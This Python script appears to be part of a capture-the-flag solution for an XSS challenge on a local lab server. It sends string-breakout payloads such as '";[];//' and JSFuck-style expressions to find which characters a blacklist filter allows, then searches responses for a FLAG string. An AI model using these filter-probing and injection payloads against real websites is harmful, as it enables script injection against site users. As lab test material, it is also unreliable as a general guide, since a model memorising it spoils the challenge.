import requests
import re

BASE_URL = "http://127.0.0.1:32887/page"

print("="*80)
print("TESTING ALLOWED CHARACTER SET AND BYPASS TECHNIQUES")
print("="*80)

# Test uppercase letters
print("\n### Test 1: Uppercase letters ###")
test_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
allowed_upper = []

for char in test_chars:
    response = requests.post(BASE_URL, data={"name": f'";{char};//'})
    if "Sorry you can't use" in response.text:
        print(f"'{char}' -> ✗ BLOCKED")
    else:
        allowed_upper.append(char)
        print(f"'{char}' -> ✓ ALLOWED")

print(f"\nAllowed uppercase: {allowed_upper}")

# Test numbers
print("\n\n### Test 2: Numbers ###")
test_nums = "0123456789"
allowed_nums = []

for num in test_nums:
    response = requests.post(BASE_URL, data={"name": f'";{num};//'})
    if "Sorry you can't use" in response.text:
        print(f"'{num}' -> ✗ BLOCKED")
    else:
        allowed_nums.append(num)
        print(f"'{num}' -> ✓ ALLOWED")

print(f"\nAllowed numbers: {allowed_nums}")

# Test special characters that might be useful
print("\n\n### Test 3: Special characters ###")
special_chars = "!@#$%^&*()[]{}+-=_|\\:;\"'<>,.?/`~"
allowed_special = []

for char in special_chars:
    response = requests.post(BASE_URL, data={"name": f'";{char};//'})
    if "Sorry you can't use" in response.text:
        print(f"'{char}' -> ✗ BLOCKED")
    else:
        allowed_special.append(char)
        print(f"'{char}' -> ✓ ALLOWED")

print(f"\nAllowed special chars: {allowed_special}")

# Now test if pure JSFuck actually executes
print("\n\n### Test 4: Pure JSFuck execution test ###")

# JSFuck representation of alert(1) - this is shortened for testing
# Full JSFuck is very long, so let's test if the approach works
jsfuck_tests = [
    # Test if we can break out of string and execute code
    ('";[];//', "Break string with array"),
    ('"+[]+"', "Try to concatenate arrays"),
    ('";[]["constructor"];//', "Access constructor (will fail due to \'c\')"),
    ('";[][+[]];//', "Array access with number"),
]

for payload, desc in jsfuck_tests:
    response = requests.post(BASE_URL, data={"name": payload})
    print(f"\n{desc}")
    print(f"Payload: {payload}")
    
    if "Sorry you can't use" in response.text:
        match = re.search(r"Sorry you can't use: '(.)'", response.text)
        blocked = match.group(1) if match else "?"
        print(f"✗ BLOCKED (character '{blocked}')")
    else:
        # Look at what's in the JavaScript
        match = re.search(r'<script>([^<]+)</script>', response.text, re.DOTALL)
        if match:
            js_code = match.group(1).strip()
            print(f"✓ ALLOWED")
            print(f"JavaScript code:\n{js_code}")
        
        # Check for flag
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"\n🚩 FLAG FOUND: {flag_match.group(0)}")

# Test template literals or other bypass techniques
print("\n\n### Test 5: Alternative JavaScript syntax ###")

alt_syntax = [
    ('";`${[]}`;//', "Template literal"),
    ('";(()=>{});//', "Arrow function"),
    ('";[...[]]//', "Spread operator"),
    ('";({});//', "Object literal"),
]

for payload, desc in alt_syntax:
    response = requests.post(BASE_URL, data={"name": payload})
    print(f"\n{desc}")
    print(f"Payload: {payload}")
    
    if "Sorry you can't use" in response.text:
        match = re.search(r"Sorry you can't use: '(.)'", response.text)
        blocked = match.group(1) if match else "?"
        print(f"✗ BLOCKED (character '{blocked}')")
    else:
        print(f"✓ ALLOWED")
        # Extract the script section
        match = re.search(r'<script>([^<]+)</script>', response.text, re.DOTALL)
        if match:
            js_code = match.group(1).strip()
            print(f"JavaScript: {js_code[:200]}")

# Since lowercase is blocked, check if we can use property access with bracket notation and numbers
print("\n\n### Test 6: Numeric property access ###")

# In JavaScript: "constructor"[0] gives 'c', but we can't use that
# However, we can use things like []["constructor"] if we build "constructor" differently
# Let's see if we can access properties using only symbols

symbol_tests = [
    ('";[][[]];//', "Array with undefined index"),
    ('";[]+[]+[];//', "Multiple array concatenation"),
    ('";!![]+!![];//', "Boolean addition"),
    ('";+[];//', "Unary plus on array"),
    ('";[][+[]];//', "Array access with +[]"),
]

for payload, desc in symbol_tests:
    response = requests.post(BASE_URL, data={"name": payload})
    print(f"\n{desc}")
    print(f"Payload: {payload}")
    
    if "Sorry you can't use" in response.text:
        print(f"✗ BLOCKED")
    else:
        print(f"✓ ALLOWED")
        match = re.search(r'<script>\s*var name = "([^"]*)";', response.text)
        if match:
            reflected = match.group(1)
            print(f"Reflected: {reflected}")

print("\n" + "="*80)
print("CHARACTER SET ANALYSIS COMPLETE")
print("="*80)

